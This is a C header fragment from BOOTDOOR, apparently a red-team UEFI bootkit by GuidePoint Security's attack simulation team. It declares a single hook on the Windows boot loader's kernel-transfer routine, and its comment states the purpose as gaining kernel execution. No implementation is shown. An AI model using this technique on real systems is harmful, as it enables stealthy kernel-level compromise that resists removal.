/*!
 *
 * BOOTDOOR
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

/*!
 *
 * Purpose:
 *
 * Inserts a hook into a kernel driver to
 * achieve execution within the windows
 * kernel.
 *
!*/
D_SEC( B ) VOID EFIAPI OslArchTransferToKernel( PVOID LoaderBlock, PVOID Entry );
